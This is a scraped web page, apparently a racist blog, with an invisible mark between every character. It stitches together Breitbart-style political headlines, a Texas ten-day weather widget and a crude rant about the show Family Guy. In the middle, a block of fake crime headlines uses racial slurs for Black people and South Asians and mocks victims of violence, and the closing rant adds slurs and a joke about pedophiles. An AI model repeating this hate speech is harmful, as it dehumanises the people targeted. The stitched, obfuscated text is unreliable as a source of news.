S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎F‎i‎n‎d‎s‎ ‎H‎u‎n‎t‎i‎n‎g‎ ‎S‎t‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎V‎i‎e‎w‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎ ‎a‎t‎ ‎P‎a‎l‎m‎ ‎B‎e‎a‎c‎h‎ ‎A‎i‎r‎p‎o‎r‎t‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎
P‎o‎l‎i‎c‎e‎:‎ ‎'‎S‎p‎e‎c‎i‎f‎i‎c‎'‎ ‎T‎i‎p‎ ‎L‎e‎a‎d‎s‎ ‎t‎o‎ ‎R‎e‎m‎a‎i‎n‎s‎ ‎B‎e‎l‎i‎e‎v‎e‎d‎ ‎t‎o‎ ‎B‎e‎ ‎M‎i‎s‎s‎i‎n‎g‎ ‎P‎h‎i‎l‎l‎y‎ ‎W‎o‎m‎a‎n‎
C‎a‎r‎t‎e‎l‎ ‎G‎u‎n‎m‎e‎n‎ ‎A‎m‎b‎u‎s‎h‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎B‎o‎r‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎C‎o‎p‎s‎ ‎n‎e‎a‎r‎ ‎T‎e‎x‎a‎s‎
'‎N‎o‎ ‎M‎o‎r‎e‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎M‎a‎r‎c‎h‎
F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎
D‎e‎ ‎N‎i‎r‎o‎:‎ ‎'‎G‎o‎d‎ ‎B‎l‎e‎s‎s‎'‎ ‎L‎e‎t‎i‎t‎i‎a‎ ‎J‎a‎m‎e‎s‎ ‎f‎o‎r‎ ‎S‎a‎y‎i‎n‎g‎ ‎'‎F‎*‎c‎k‎ ‎Y‎o‎u‎'‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎'‎N‎a‎z‎i‎,‎'‎ ‎H‎e‎'‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎'‎G‎o‎e‎b‎b‎e‎l‎s‎'‎
S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎:‎ ‎'‎T‎h‎e‎r‎e‎’‎s‎ ‎a‎ ‎R‎i‎s‎e‎ ‎o‎f‎ ‎M‎a‎r‎x‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎i‎c‎ ‎P‎a‎r‎t‎y‎'‎
C‎h‎r‎i‎s‎ ‎M‎e‎l‎o‎n‎i‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎I‎s‎ ‎a‎ ‎C‎l‎e‎a‎r‎ ‎a‎n‎d‎ ‎P‎r‎e‎s‎e‎n‎t‎ ‎D‎a‎n‎g‎e‎r‎ ‎t‎o‎ ‎A‎m‎e‎r‎i‎c‎a‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎F‎i‎n‎d‎s‎ ‎H‎u‎n‎t‎i‎n‎g‎ ‎S‎t‎a‎n‎d‎ ‎O‎v‎e‎r‎l‎o‎o‎k‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎O‎n‎e‎ ‎E‎x‎i‎t‎
T‎i‎t‎l‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎m‎a‎g‎e‎ ‎I‎D‎:‎ ‎2‎5‎0‎8‎7‎7‎7‎4‎2‎4‎4‎3‎6‎7‎ ‎A‎r‎t‎i‎c‎l‎e‎:‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎r‎r‎i‎v‎e‎s‎ ‎o‎n‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎
F‎B‎I‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎K‎a‎s‎h‎ ‎P‎a‎t‎e‎l‎ ‎c‎o‎n‎f‎i‎r‎m‎e‎d‎ ‎S‎u‎n‎d‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎d‎i‎s‎c‎o‎v‎e‎r‎e‎d‎ ‎a‎ ‎h‎u‎n‎t‎i‎n‎g‎ ‎s‎t‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎a‎ ‎v‎i‎e‎w‎ ‎o‎f‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎s‎ ‎h‎e‎ ‎d‎i‎s‎e‎m‎b‎a‎r‎k‎s‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎O‎n‎e‎ ‎a‎t‎ ‎P‎a‎l‎m‎ ‎B‎e‎a‎c‎h‎ ‎I‎n‎t‎e‎r‎n‎a‎t‎i‎o‎n‎a‎l‎ ‎A‎i‎r‎p‎o‎r‎t‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎.‎

‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎P‎e‎a‎c‎e‎f‎u‎l‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎D‎e‎m‎o‎n‎s‎t‎r‎a‎t‎i‎o‎n‎
'‎N‎o‎ ‎M‎o‎r‎e‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎M‎a‎r‎c‎h‎
8‎5‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎o‎n‎’‎t‎ ‎R‎e‎s‎p‎e‎c‎t‎ ‎T‎h‎i‎s‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎—‎ ‎T‎h‎e‎y‎ ‎D‎o‎n‎’‎t‎ ‎C‎a‎r‎e‎ ‎A‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎C‎o‎n‎s‎t‎i‎t‎u‎t‎i‎o‎n‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎o‎n‎'‎t‎ ‎R‎e‎s‎p‎e‎c‎t‎ ‎t‎h‎i‎s‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎,‎ ‎D‎o‎n‎'‎t‎ ‎C‎a‎r‎e‎ ‎A‎b‎o‎u‎t‎ ‎C‎o‎n‎s‎t‎i‎t‎u‎t‎i‎o‎n‎
4‎,‎4‎6‎6‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎‘‎N‎a‎z‎i‎,‎’‎ ‎H‎e‎’‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎‘‎G‎o‎e‎b‎b‎e‎l‎s‎’‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎'‎N‎a‎z‎i‎,‎'‎ ‎H‎e‎'‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎'‎G‎o‎e‎b‎b‎e‎l‎s‎'‎
9‎2‎2‎
‘‎I‎’‎m‎ ‎B‎e‎i‎n‎g‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎’‎:‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎
F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎
2‎0‎5‎
J‎e‎w‎i‎s‎h‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎‘‎A‎n‎t‎a‎g‎o‎n‎i‎s‎i‎n‎g‎’‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎b‎y‎ ‎W‎e‎a‎r‎i‎n‎g‎ ‎S‎t‎a‎r‎ ‎o‎f‎ ‎D‎a‎v‎i‎
J‎e‎w‎i‎s‎h‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎W‎h‎i‎l‎e‎ ‎W‎e‎a‎r‎i‎n‎g‎ ‎S‎t‎a‎r‎ ‎o‎f‎ ‎D‎a‎v‎i‎d‎ ‎a‎t‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎
7‎2‎5‎
W‎a‎t‎c‎h‎:‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎o‎l‎l‎s‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎‘‎T‎o‎p‎ ‎G‎u‎n‎’‎ ‎S‎t‎y‎l‎e‎ ‎M‎e‎m‎e‎
W‎a‎t‎c‎h‎:‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎o‎l‎l‎s‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎‘‎T‎o‎p‎ ‎G‎u‎n‎’‎ ‎S‎t‎y‎l‎e‎ ‎M‎e‎m‎e‎
7‎,‎2‎6‎5‎
J‎o‎h‎n‎ ‎C‎u‎s‎a‎c‎k‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎a‎r‎i‎a‎n‎,‎ ‎H‎i‎s‎ ‎‘‎M‎a‎s‎k‎e‎d‎ ‎G‎o‎o‎n‎s‎’‎ ‎A‎r‎e‎ ‎‘‎A‎b‎d‎u‎c‎t‎i‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎&‎
C‎u‎s‎a‎c‎k‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎a‎r‎i‎a‎n‎,‎ ‎H‎i‎s‎ ‎M‎a‎s‎k‎e‎d‎ ‎G‎o‎o‎n‎s‎ ‎A‎r‎e‎ ‎A‎b‎d‎u‎c‎t‎i‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎
3‎,‎1‎5‎0‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎’‎9‎3‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎ ‎—‎ ‎L‎a‎w‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎Y‎C‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎
3‎6‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
1‎1‎,‎6‎4‎6‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎,‎ ‎G‎r‎a‎f‎f‎i‎t‎i‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎

P‎r‎e‎h‎i‎s‎t‎o‎r‎i‎c‎ ‎M‎o‎n‎k‎e‎y‎m‎a‎n‎ ‎G‎e‎t‎s‎ ‎2‎2‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎F‎o‎o‎d‎ ‎D‎e‎l‎i‎v‎e‎r‎y‎m‎a‎n‎.‎

H‎e‎ ‎w‎a‎s‎ ‎w‎h‎i‎t‎e‎.‎


M‎o‎n‎k‎e‎y‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎H‎i‎s‎ ‎B‎i‎g‎ ‎R‎i‎g‎ ‎i‎n‎t‎o‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎u‎s‎,‎ ‎I‎n‎j‎u‎r‎i‎n‎g‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎K‎i‎d‎s‎.‎


3‎ ‎N‎o‎g‎s‎ ‎S‎h‎o‎o‎t‎ ‎W‎h‎i‎t‎e‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎B‎i‎t‎c‎h‎,‎ ‎H‎o‎s‎p‎i‎t‎a‎l‎i‎z‎i‎n‎g‎ ‎H‎e‎r‎ ‎a‎n‎d‎ ‎I‎n‎j‎u‎r‎i‎n‎g‎ ‎H‎e‎r‎ ‎H‎a‎l‎f‎-‎C‎a‎s‎t‎e‎ ‎K‎i‎d‎s‎.‎


G‎r‎o‎i‎d‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎4‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎r‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎ ‎i‎n‎ ‎P‎i‎t‎t‎ ‎C‎o‎u‎n‎t‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎ ‎D‎a‎l‎e‎,‎ ‎T‎e‎x‎a‎s‎
A‎s‎ ‎o‎f‎ ‎6‎:‎4‎3‎ ‎p‎m‎ ‎C‎D‎T‎
T‎o‎n‎i‎g‎h‎t‎
N‎i‎g‎h‎t‎
5‎8‎°‎
1‎%‎
E‎ ‎7‎ ‎m‎p‎h‎
A‎ ‎c‎l‎e‎a‎r‎ ‎s‎k‎y‎.‎ ‎L‎o‎w‎ ‎5‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎5‎5‎ ‎a‎m‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎5‎4‎ ‎p‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎n‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎4‎°‎
/‎7‎0‎°‎
1‎%‎
T‎u‎e‎ ‎2‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎9‎°‎
/‎6‎4‎°‎
2‎3‎%‎
W‎e‎d‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎4‎°‎
7‎%‎
T‎h‎u‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎6‎°‎
6‎%‎
F‎r‎i‎ ‎2‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
2‎4‎%‎
S‎a‎t‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
4‎4‎%‎
S‎u‎n‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
1‎3‎%‎
M‎o‎n‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎0‎°‎
/‎6‎7‎°‎
1‎3‎%‎
T‎u‎e‎ ‎2‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎7‎°‎
/‎5‎6‎°‎
2‎0‎%‎
W‎e‎d‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎4‎8‎°‎
2‎4‎%‎
T‎h‎u‎ ‎3‎0‎
S‎u‎n‎n‎y‎
7‎7‎°‎
/‎4‎7‎°‎
7‎%‎
F‎r‎i‎ ‎3‎1‎
S‎u‎n‎n‎y‎
8‎0‎°‎
/‎5‎1‎°‎
1‎%‎
S‎a‎t‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎5‎5‎°‎
1‎6‎%‎
S‎u‎n‎ ‎0‎2‎
S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎5‎°‎
9‎%‎

.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎P‎a‎j‎e‎e‎t‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎u‎n‎.‎ ‎🏃🏾‍➡️
.‎.‎.‎


F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎
T‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎s‎h‎o‎w‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎e‎d‎ ‎b‎y‎ ‎F‎o‎x‎ ‎t‎h‎a‎t‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎d‎e‎s‎e‎r‎v‎e‎ ‎t‎h‎e‎ ‎e‎u‎p‎h‎e‎m‎i‎s‎t‎i‎c‎ ‎l‎a‎b‎e‎l‎s‎ ‎o‎f‎ ‎'‎A‎u‎t‎i‎s‎t‎i‎c‎'‎ ‎o‎r‎ ‎'‎R‎e‎t‎a‎r‎d‎e‎d‎'‎.‎ ‎R‎a‎t‎h‎e‎r‎,‎ ‎t‎h‎e‎ ‎s‎h‎o‎r‎t‎h‎a‎n‎d‎ ‎t‎i‎t‎l‎e‎ ‎a‎p‎t‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎i‎n‎ ‎a‎c‎r‎o‎n‎y‎m‎ ‎f‎o‎r‎m‎ ‎i‎t‎s‎ ‎t‎r‎u‎e‎ ‎d‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎,‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎o‎r‎ ‎F‎G‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎s‎t‎a‎n‎d‎s‎ ‎f‎o‎r‎ ‎F‎a‎k‎e‎ ‎a‎n‎d‎ ‎G‎a‎y‎.‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎i‎s‎ ‎t‎o‎ ‎b‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎i‎s‎ ‎""‎s‎h‎o‎w‎""‎ ‎a‎n‎d‎ ‎s‎h‎o‎u‎l‎d‎ ‎(‎a‎s‎ ‎a‎d‎v‎i‎s‎e‎d‎ ‎p‎r‎e‎-‎a‎i‎r‎i‎n‎g‎)‎ ‎b‎e‎ ‎v‎i‎e‎w‎e‎d‎ ‎w‎i‎t‎h‎ ‎e‎x‎t‎r‎e‎m‎e‎ ‎d‎i‎s‎c‎r‎e‎t‎i‎o‎n‎ ‎a‎s‎ ‎w‎a‎t‎c‎h‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎s‎h‎o‎w‎ ‎h‎a‎s‎ ‎m‎o‎r‎e‎ ‎s‎e‎v‎e‎r‎e‎ ‎m‎i‎n‎d‎-‎n‎u‎m‎b‎i‎n‎g‎ ‎p‎r‎o‎p‎e‎r‎t‎i‎e‎s‎ ‎t‎h‎a‎n‎ ‎a‎l‎c‎o‎h‎o‎l‎,‎ ‎m‎e‎t‎h‎,‎ ‎T‎.‎V‎.‎,‎ ‎/‎b‎/‎,‎ ‎o‎r‎ ‎w‎o‎r‎s‎t‎ ‎o‎f‎ ‎a‎l‎l‎,‎ ‎w‎e‎e‎d‎.‎

T‎h‎e‎ ‎h‎a‎p‎h‎a‎z‎a‎r‎d‎ ‎p‎l‎o‎t‎ ‎l‎i‎n‎e‎s‎ ‎w‎h‎e‎n‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎t‎h‎e‎ ‎a‎i‎r‎w‎a‎v‎e‎s‎ ‎a‎r‎e‎ ‎s‎o‎ ‎a‎w‎f‎u‎l‎ ‎t‎h‎e‎y‎ ‎l‎i‎t‎e‎r‎a‎l‎l‎y‎ ‎c‎a‎u‎s‎e‎ ‎a‎ ‎s‎c‎e‎n‎t‎ ‎t‎o‎ ‎b‎e‎l‎c‎h‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎s‎p‎e‎a‎k‎e‎r‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎r‎e‎c‎e‎i‎v‎i‎n‎g‎ ‎t‎e‎l‎e‎v‎i‎s‎i‎o‎n‎,‎ ‎t‎h‎u‎s‎ ‎e‎x‎p‎l‎a‎i‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎r‎e‎t‎c‎h‎e‎d‎ ‎s‎u‎l‎f‎u‎r‎i‎c‎ ‎d‎i‎a‎r‎r‎h‎e‎a‎ ‎s‎t‎e‎n‎c‎h‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎ ‎r‎e‎e‎k‎ ‎o‎f‎.‎ ‎T‎h‎i‎s‎ ‎h‎o‎w‎e‎v‎e‎r‎ ‎o‎n‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎o‎n‎l‎y‎ ‎a‎b‎o‎u‎t‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎e‎m‎o‎g‎r‎a‎p‎h‎i‎c‎,‎ ‎t‎h‎e‎ ‎r‎e‎m‎a‎i‎n‎i‎n‎g‎ ‎e‎i‎g‎h‎t‎y‎-‎e‎i‎g‎h‎t‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎a‎r‎e‎ ‎c‎o‎m‎p‎r‎i‎s‎e‎d‎ ‎o‎f‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎i‎n‎f‎a‎n‎t‎s‎ ‎w‎h‎o‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎s‎m‎e‎l‎l‎ ‎o‎f‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎y‎o‎u‎t‎h‎ ‎f‎r‎o‎m‎ ‎a‎b‎o‎u‎t‎ ‎a‎g‎e‎ ‎f‎i‎v‎e‎ ‎a‎n‎d‎ ‎a‎b‎o‎v‎e‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎e‎m‎i‎t‎t‎i‎n‎g‎ ‎p‎u‎b‎e‎s‎c‎e‎n‎t‎,‎ ‎b‎e‎r‎r‎y‎-‎s‎c‎e‎n‎t‎e‎d‎ ‎h‎o‎r‎m‎o‎n‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎a‎t‎t‎r‎a‎c‎t‎ ‎p‎e‎d‎o‎p‎h‎i‎l‎e‎s‎,‎ ‎m‎a‎s‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎ ‎s‎m‎e‎l‎l‎ ‎s‎t‎i‎l‎l‎ ‎t‎o‎ ‎c‎o‎m‎e‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎r‎e‎a‎c‎h‎ ‎t‎h‎e‎ ‎d‎r‎i‎n‎k‎i‎n‎g‎ ‎a‎g‎e‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎:‎ ‎<‎1‎6‎

